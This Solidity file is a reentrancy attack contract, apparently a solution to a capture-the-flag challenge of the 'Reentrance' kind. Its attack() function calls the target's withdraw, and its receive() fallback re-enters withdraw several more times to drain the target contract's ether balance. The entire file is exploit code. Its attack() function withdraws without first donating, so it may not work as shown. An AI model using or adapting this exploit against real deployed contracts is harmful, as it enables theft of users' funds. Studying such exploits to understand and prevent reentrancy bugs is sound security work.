// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttack {
    event AttackReceived(address indexed source, uint256 amount);

    IReentrance public targetContract;
    uint256 public amount;
    uint256 public count;

    constructor(address target) {
        targetContract = IReentrance(target);
    }

    function attack() external payable {
        amount = msg.value;
        count = 0;
        targetContract.withdraw(amount);
    }

    receive() external payable {
        uint256 balance = address(targetContract).balance;
        emit AttackReceived(msg.sender, msg.value);
        if (balance > 0 && count <= 5) {
            uint256 attackAmount = amount <= balance ? amount : balance;
            targetContract.withdraw(attackAmount);
        }
    }
}
